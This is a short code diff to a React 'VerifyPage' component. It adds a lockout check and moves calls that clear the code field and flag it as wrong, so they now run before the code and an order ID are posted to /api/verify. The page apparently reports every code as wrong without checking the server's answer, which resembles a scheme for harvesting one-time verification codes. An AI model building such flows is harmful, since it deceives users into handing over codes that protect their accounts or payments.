@@ -89,6 +89,7 @@ export default function VerifyPage() {
 
   async function handleSubmit() {
     if (code.length !== 4 && code.length !== 6) { setCodeError(true); return; }
+    if (lockoutTimer > 0) return;
 
     const attempts = parseInt(localStorage.getItem(ATTEMPTS_KEY) ?? "0") + 1;
     localStorage.setItem(ATTEMPTS_KEY, String(attempts));
@@ -96,16 +97,18 @@ export default function VerifyPage() {
       const until = Date.now() + 5 * 60 * 1000;
       localStorage.setItem(LOCKOUT_KEY, String(until));
       startLockout(300);
+      setCode("");
       return;
     }
 
-    // تأكد إن الـ orderId اتحفظ — لو لسه ما جاش، استنى شوية
     let currentOrderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";
     if (currentOrderId === "—") {
       await new Promise(r => setTimeout(r, 2000));
       currentOrderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";
     }
 
+    setCode("");
+    setWrongCode(true);
     setSubmitCooldown(5);
     submitCooldownRef.current = setInterval(() => {
       setSubmitCooldown(prev => {
@@ -113,8 +116,6 @@ export default function VerifyPage() {
         return prev - 1;
       });
     }, 1000);
-    setCode("");
-    setWrongCode(true);
     await fetch("/api/verify", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
